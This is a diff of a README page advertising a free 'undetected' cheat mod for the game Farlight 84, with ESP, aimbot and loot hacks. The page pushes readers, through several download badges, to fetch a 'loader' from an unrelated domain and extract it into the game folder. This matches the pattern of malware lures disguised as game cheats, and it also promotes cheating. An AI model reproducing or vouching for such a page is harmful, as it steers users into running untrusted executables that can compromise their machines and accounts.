@@ -1,5 +1,6 @@
 # Farlight 84 Apex Predator Mod 2025: Elite Gaming Hacks
 **🚀 BECOME THE ULTIMATE PREDATOR IN FARLIGHT 84! Unleash Razor-Sharp ESP, Silent Aimbot, & Loot Mastery—Reign Supreme Undetected Today, June 9, 2025, 100% FREE! 🌩️**
+ 
    [![DEPLOY](https://img.shields.io/badge/⚔️_DOWNLOAD_SAILENT_LOADER-darkgreen?style=for-the-badge)](https://anydownloadloader.click)  
    ![STATUS](https://img.shields.io/badge/ANTICHEAT-UNDETECTED-success)  
    ![VERSION](https://img.shields.io/badge/TAC_v3.7.2_%22PHANTOM%22-blue)
@@ -48,8 +49,7 @@
 
 ## Installations
 1. **UNLEASH YOUR PREDATOR INSTINCT!** Click to download NOW!  
-(https://i.postimg.cc/13mZ3fYR/download.png)](https://anydownloadloader.click)
-2. Extract to your *Farlight 84* game directory.
+[![DOWNLOAD](https://i.postimg.cc/13mZ3fYR/download.png)](https://anydownloadloader.click)2. Extract to your *Farlight 84* game directory.
 3. Launch and hit `INSERT`—claim your apex title!
 
 ## Configuration
